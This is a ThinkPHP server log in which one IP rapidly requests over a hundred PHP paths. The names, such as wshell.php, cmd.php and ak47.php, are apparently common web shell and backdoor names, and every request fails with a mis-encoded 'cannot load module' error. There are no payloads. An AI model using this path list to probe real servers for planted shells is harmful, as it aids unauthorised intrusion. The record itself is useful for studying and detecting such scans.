INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000086s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Db__.init

[ 2019-04-06T11:38:07+08:00 ] 118.24.122.13 /wp-admins.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wp-admins

[ 2019-04-06T11:38:07+08:00 ] 118.24.122.13 /m.php?pbid=open
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: [ app_init ] --END-- [ RunTime:0.000091s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:M

[ 2019-04-06T11:38:07+08:00 ] 118.24.122.13 /099.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:099

[ 2019-04-06T11:38:07+08:00 ] 118.24.122.13 /_404.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:_404

[ 2019-04-06T11:38:08+08:00 ] 118.24.122.13 /Alarg53.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Alarg53

[ 2019-04-06T11:38:10+08:00 ] 118.24.122.13 /lapan.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000093s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Lapan

[ 2019-04-06T11:38:10+08:00 ] 118.24.122.13 /p34ky1337.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000093s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:P34ky1337

[ 2019-04-06T11:38:10+08:00 ] 118.24.122.13 /pk1914.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Pk1914

[ 2019-04-06T11:38:10+08:00 ] 118.24.122.13 /sllolx.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Sllolx

[ 2019-04-06T11:38:10+08:00 ] 118.24.122.13 /Skri.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000086s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Skri

[ 2019-04-06T11:38:10+08:00 ] 118.24.122.13 /db_dataml.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Db_dataml

[ 2019-04-06T11:38:10+08:00 ] 118.24.122.13 /db_desql.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000086s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Db_desql

[ 2019-04-06T11:38:10+08:00 ] 118.24.122.13 /mx.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000079s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Mx

[ 2019-04-06T11:38:10+08:00 ] 118.24.122.13 /wshell.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wshell

[ 2019-04-06T11:38:10+08:00 ] 118.24.122.13 /xshell.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000069s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Xshell

[ 2019-04-06T11:38:10+08:00 ] 118.24.122.13 /qq.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000073s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Qq

[ 2019-04-06T11:38:11+08:00 ] 118.24.122.13 /conflg.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Conflg

[ 2019-04-06T11:38:11+08:00 ] 118.24.122.13 /conflg.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Conflg

[ 2019-04-06T11:38:11+08:00 ] 118.24.122.13 /lindex.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Lindex

[ 2019-04-06T11:38:11+08:00 ] 118.24.122.13 /phpstudy.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Phpstudy

[ 2019-04-06T11:38:12+08:00 ] 118.24.122.13 /phpStudy.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000062s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:PhpStudy

[ 2019-04-06T11:38:12+08:00 ] 118.24.122.13 /weixiao.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Weixiao

[ 2019-04-06T11:38:12+08:00 ] 118.24.122.13 /feixiang.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000086s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Feixiang

[ 2019-04-06T11:38:12+08:00 ] 118.24.122.13 /ak47.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000078s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Ak47

[ 2019-04-06T11:38:12+08:00 ] 118.24.122.13 /ak48.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Ak48

[ 2019-04-06T11:38:12+08:00 ] 118.24.122.13 /xiao.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000084s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Xiao

[ 2019-04-06T11:38:12+08:00 ] 118.24.122.13 /yao.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Yao

[ 2019-04-06T11:38:12+08:00 ] 118.24.122.13 /defect.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Defect

[ 2019-04-06T11:38:12+08:00 ] 118.24.122.13 /webslee.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Webslee

[ 2019-04-06T11:38:12+08:00 ] 118.24.122.13 /q.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Q

[ 2019-04-06T11:38:14+08:00 ] 118.24.122.13 /hm.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000074s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Hm

[ 2019-04-06T11:38:14+08:00 ] 118.24.122.13 /cainiao.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Cainiao

[ 2019-04-06T11:38:14+08:00 ] 118.24.122.13 /zuoshou.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000086s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Zuoshou

[ 2019-04-06T11:38:17+08:00 ] 118.24.122.13 /zuo.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Zuo

[ 2019-04-06T11:38:18+08:00 ] 118.24.122.13 /aotu.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Aotu

[ 2019-04-06T11:38:18+08:00 ] 118.24.122.13 /aotu7.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000093s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Aotu7

[ 2019-04-06T11:38:18+08:00 ] 118.24.122.13 /cmd.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Cmd

[ 2019-04-06T11:38:18+08:00 ] 118.24.122.13 /bak.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Bak

[ 2019-04-06T11:38:18+08:00 ] 118.24.122.13 /system.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:System

[ 2019-04-06T11:38:18+08:00 ] 118.24.122.13 /l6.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:L6

[ 2019-04-06T11:38:18+08:00 ] 118.24.122.13 /l7.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000086s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:L7

[ 2019-04-06T11:38:18+08:00 ] 118.24.122.13 /l8.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000079s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:L8

[ 2019-04-06T11:38:24+08:00 ] 118.24.122.13 /q.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000067s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Q

[ 2019-04-06T11:38:24+08:00 ] 118.24.122.13 /56.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000092s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:56

[ 2019-04-06T11:38:27+08:00 ] 118.24.122.13 /xx.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Xx

[ 2019-04-06T11:38:27+08:00 ] 118.24.122.13 /yumo.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Yumo

[ 2019-04-06T11:38:27+08:00 ] 118.24.122.13 /min.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000079s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Min

[ 2019-04-06T11:38:27+08:00 ] 118.24.122.13 /wan.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000061s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wan

[ 2019-04-06T11:38:27+08:00 ] 118.24.122.13 /wanan.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wanan

[ 2019-04-06T11:38:27+08:00 ] 118.24.122.13 /ssaa.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Ssaa

[ 2019-04-06T11:38:27+08:00 ] 118.24.122.13 /qq.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000102s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Qq

[ 2019-04-06T11:38:27+08:00 ] 118.24.122.13 /aw.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Aw

[ 2019-04-06T11:38:28+08:00 ] 118.24.122.13 /12.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:12

[ 2019-04-06T11:38:28+08:00 ] 118.24.122.13 /hh.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000075s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Hh

[ 2019-04-06T11:38:28+08:00 ] 118.24.122.13 /ak.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Ak

[ 2019-04-06T11:38:28+08:00 ] 118.24.122.13 /ip.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000075s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Ip

[ 2019-04-06T11:38:28+08:00 ] 118.24.122.13 /infoo.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Infoo

[ 2019-04-06T11:38:28+08:00 ] 118.24.122.13 /qq.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000092s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Qq

[ 2019-04-06T11:38:28+08:00 ] 118.24.122.13 /qwe.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Qwe

[ 2019-04-06T11:38:28+08:00 ] 118.24.122.13 /1213.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000030s ]
INFO: [ app_init ] --END-- [ RunTime:0.000102s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:1213

[ 2019-04-06T11:38:29+08:00 ] 118.24.122.13 /post.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000068s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Post

[ 2019-04-06T11:38:29+08:00 ] 118.24.122.13 /aaaa.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000069s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Aaaa

[ 2019-04-06T11:38:29+08:00 ] 118.24.122.13 /h1.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:H1

[ 2019-04-06T11:38:29+08:00 ] 118.24.122.13 /test.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Test

[ 2019-04-06T11:38:30+08:00 ] 118.24.122.13 /3.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000062s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:3

[ 2019-04-06T11:38:30+08:00 ] 118.24.122.13 /phpinfi.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Phpinfi

[ 2019-04-06T11:38:30+08:00 ] 118.24.122.13 /9510.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000079s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:9510

[ 2019-04-06T11:38:30+08:00 ] 118.24.122.13 /python.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000069s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Python

[ 2019-04-06T11:38:30+08:00 ] 118.24.122.13 /default.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000091s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Default

[ 2019-04-06T11:38:36+08:00 ] 118.24.122.13 /sean.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Sean

[ 2019-04-06T11:38:36+08:00 ] 118.24.122.13 /app.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:App

[ 2019-04-06T11:38:36+08:00 ] 118.24.122.13 /help.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Help

[ 2019-04-06T11:38:36+08:00 ] 118.24.122.13 /tiandi.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000070s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Tiandi

[ 2019-04-06T11:38:37+08:00 ] 118.24.122.13 /1.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000091s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:1

[ 2019-04-06T11:38:37+08:00 ] 118.24.122.13 /miao.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Miao

[ 2019-04-06T11:38:38+08:00 ] 118.24.122.13 /xz.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Xz

[ 2019-04-06T11:38:42+08:00 ] 118.24.122.13 /linuxse.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Linuxse

[ 2019-04-06T11:38:46+08:00 ] 118.24.122.13 /zuoindex.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000062s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Zuoindex

[ 2019-04-06T11:38:46+08:00 ] 118.24.122.13 /zshmindex.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Zshmindex

[ 2019-04-06T11:38:46+08:00 ] 118.24.122.13 /tomcat.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Tomcat

[ 2019-04-06T11:38:46+08:00 ] 118.24.122.13 /ceshi.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Ceshi

[ 2019-04-06T11:38:46+08:00 ] 118.24.122.13 /1hou.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:1hou

[ 2019-04-06T11:38:46+08:00 ] 118.24.122.13 /ou2.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Ou2

[ 2019-04-06T11:38:46+08:00 ] 118.24.122.13 /zuos.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000031s ]
INFO: [ app_init ] --END-- [ RunTime:0.000105s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Zuos

[ 2019-04-06T11:38:46+08:00 ] 118.24.122.13 /zuoss.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000090s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Zuoss

[ 2019-04-06T11:38:46+08:00 ] 118.24.122.13 /zuoshss.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000067s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Zuoshss

[ 2019-04-06T11:38:46+08:00 ] 118.24.122.13 /boots.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Boots

[ 2019-04-06T11:38:50+08:00 ] 118.24.122.13 /s.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000094s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:S

[ 2019-04-06T11:38:50+08:00 ] 118.24.122.13 /qw.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000075s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Qw

[ 2019-04-06T11:38:50+08:00 ] 118.24.122.13 /test.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000071s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Test

[ 2019-04-06T11:38:50+08:00 ] 118.24.122.13 /caonma.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Caonma

[ 2019-04-06T11:38:50+08:00 ] 118.24.122.13 /wcp.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000072s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wcp

[ 2019-04-06T11:38:50+08:00 ] 118.24.122.13 /u.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:U

[ 2019-04-06T11:38:50+08:00 ] 118.24.122.13 /uuu.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Uuu

[ 2019-04-06T11:38:50+08:00 ] 118.24.122.13 /sss.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000072s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Sss

[ 2019-04-06T11:38:50+08:00 ] 118.24.122.13 /ss.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000079s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Ss

[ 2019-04-06T11:38:50+08:00 ] 118.24.122.13 /sss.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Sss

[ 2019-04-06T11:38:50+08:00 ] 118.24.122.13 /mazi.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000090s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Mazi

[ 2019-04-06T11:38:51+08:00 ] 118.24.122.13 /phpini.php
INFO: [ app_init ] --START--
